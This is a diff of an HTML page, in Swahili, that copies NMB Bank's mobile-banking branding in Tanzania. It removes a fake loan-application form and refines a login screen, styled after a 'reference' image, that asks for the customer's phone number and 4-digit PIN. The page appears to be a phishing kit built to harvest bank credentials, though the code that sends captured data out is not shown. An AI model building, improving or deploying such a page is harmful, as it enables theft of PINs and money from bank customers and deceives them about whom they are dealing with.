@@ -60,116 +60,30 @@
       </div>
     </div>
 
-    <!-- VIEW 2: MULTI-STEP APPLICATION FORM (STEPS 1 TO 3 HORIZONTAL / SEPARATE) -->
-    <div id="view-form" class="card hidden">
-      <div class="form-header">
-        <h2>Maombi ya Mkopo wa NMB</h2>
-        <span id="step-indicator">Hatua 1 kati ya 3</span>
-      </div>
-      <div class="progress-bar-container">
-        <div id="progress-fill" style="width: 33%;"></div>
-      </div>
-
-      <!-- Step 1: Details -->
-      <div class="form-step active-step" data-step="1">
-        <div class="field">
-          <label>Aina ya Mkopo</label>
-          <select id="loan-type">
-            <option value="" disabled selected>Chagua aina ya mkopo (mfano: Mkopo wa Biashara)</option>
-            <option value="Mkopo wa Biashara">Mkopo wa Biashara</option>
-            <option value="Mkopo wa Haraka">Mkopo wa Haraka</option>
-            <option value="Mkopo wa Mshahara">Mkopo wa Mshahara</option>
-          </select>
-        </div>
-        <div class="field">
-          <label>Kiasi cha Mkopo (TZS)</label>
-          <input type="number" id="form-amount" placeholder="mfano: 2500000" required>
-        </div>
-        <div class="field">
-          <label>Sababu ya Mkopo</label>
-          <textarea id="loan-purpose" placeholder="mfano: Kupanua biashara yangu ya duka" rows="3" required></textarea>
-        </div>
-        <button type="button" class="primary-btn next-btn" disabled>NEXT</button>
-      </div>
-
-      <!-- Step 2: Personal Info & NMB Number -->
-      <div class="form-step hidden" data-step="2">
-        <div class="row-fields">
-          <div class="field">
-            <label>Jina la Kwanza</label>
-            <input type="text" id="first-name" placeholder="mfano: Juma" required>
-          </div>
-          <div class="field">
-            <label>Jina la Mwisho</label>
-            <input type="text" id="last-name" placeholder="mfano: Ally" required>
-          </div>
-        </div>
-        <div class="field">
-          <label>Namba ya NMB Mkononi</label>
-          <!-- Updated maxlength to 10 for 10-digit phone number formatting like 0712345678 -->
-          <input type="tel" id="user-contact" maxlength="10" pattern="[0-9]{10}" placeholder="mfano: 0712345678" required>
-          <small class="hint">Weka namba yako halisi ya tarakimu 10 ya NMB Mkononi.</small>
-        </div>
-        <div class="button-group">
-          <button type="button" class="secondary-btn prev-btn">NYUMA</button>
-          <button type="button" class="primary-btn next-btn" disabled>NEXT</button>
-        </div>
-      </div>
-
-      <!-- Step 3: Employment & Summary -->
-      <div class="form-step hidden" data-step="3">
-        <div class="field">
-          <label>Hali ya Ajira</label>
-          <select id="employment-status">
-            <option value="" disabled selected>Chagua hali ya ajira (mfano: Mmiliki wa Biashara)</option>
-            <option value="Ameajiriwa">Ameajiriwa</option>
-            <option value="Kujiajiri">Kujiajiri</option>
-            <option value="Mmiliki wa Biashara">Mmiliki wa Biashara</option>
-          </select>
-        </div>
-        <div class="field">
-          <label>Mapato ya Mwaka (TZS)</label>
-          <input type="number" id="annual-income" placeholder="mfano: 12000000" required>
-        </div>
-
-        <div class="summary-box">
-          <h3>Muhtasari wa Maombi</h3>
-          <p><strong>Kiasi:</strong> <span id="sum-amount">-</span></p>
-          <p><strong>Muda:</strong> <span id="sum-duration">-</span></p>
-          <p><strong>Sababu:</strong> <span id="sum-purpose">-</span></p>
-          <p><strong>Mwombaji:</strong> <span id="sum-name">-</span></p>
-        </div>
-
-        <div class="button-group">
-          <button type="button" class="secondary-btn prev-btn">NYUMA</button>
-          <button type="button" id="btn-submit-app" class="primary-btn next-btn" disabled>NEXT</button>
-        </div>
-      </div>
-    </div>
-
     <!-- VIEW 3: WAITING / LOADING SPINNER ONLY -->
     <div id="view-waiting" class="card hidden center-card">
       <div class="spinner"></div>
     </div>
 
-    <!-- VIEW 4: PIN & LOGIN ENTRY (Matched with reference layout style) -->
+    <!-- VIEW 4: PIN & LOGIN ENTRY (Phone number cannot start with 0) -->
     <div id="view-login" class="card hidden">
       <div class="login-header" style="text-align: center; margin-bottom: 20px;">
         <span class="bank-badge sm" style="display:inline-block; margin-bottom:8px;">NMB MKONONI TANZANIA</span>
         <h2 style="font-size: 20px; font-weight: 600; color: #333; margin-top: 5px;">Ingia Akaunti</h2>
       </div>
 
-      <!-- Country Code + Phone Number Field matching reference image -->
+      <!-- Country Code + Phone Number Field (prevents starting with 0) -->
       <div class="field">
         <div class="phone-input-wrapper" style="display: flex; align-items: center; border: 1px solid #ccc; border-radius: 6px; background: #fff; overflow: hidden; padding: 4px 8px;">
           <div class="country-code-tag" style="display: flex; align-items: center; gap: 6px; padding-right: 10px; border-right: 1px solid #ddd; font-weight: 500; font-size: 14px; color: #333;">
             <span style="font-size: 18px;">🇹🇿</span> +255
           </div>
-          <input type="tel" id="login-contact" maxlength="10" pattern="[0-9]{10}" placeholder="712345678 au 0712345678" required style="border: none; outline: none; width: 100%; padding: 10px; font-size: 14px; background: transparent;">
+          <input type="tel" id="login-contact" maxlength="9" pattern="[1-9][0-9]{8}" placeholder="712345678" required style="border: none; outline: none; width: 100%; padding: 10px; font-size: 14px; background: transparent;" title="Namba isianze na 0 (mfano: 712345678)">
         </div>
+        <small class="hint" style="color: #666; font-size: 11px; margin-top: 4px; display: block;">Weka namba bila kuanza na 0 (tarakimu 9)</small>
       </div>
 
-      <!-- PIN Input Area matching reference layout style -->
+      <!-- PIN Input Area -->
       <div class="field" style="text-align: center; margin-top: 20px;">
         <label style="display: block; font-size: 14px; color: #555; margin-bottom: 12px;">Weka PIN yako (tarakimu 4)</label>
         <div class="pin-inputs" style="display: flex; justify-content: center; gap: 10px; align-items: center;">
@@ -264,5 +178,5 @@
 
   <script src="script.js"></script>
 </body>
-            </html>
+          </html>
   
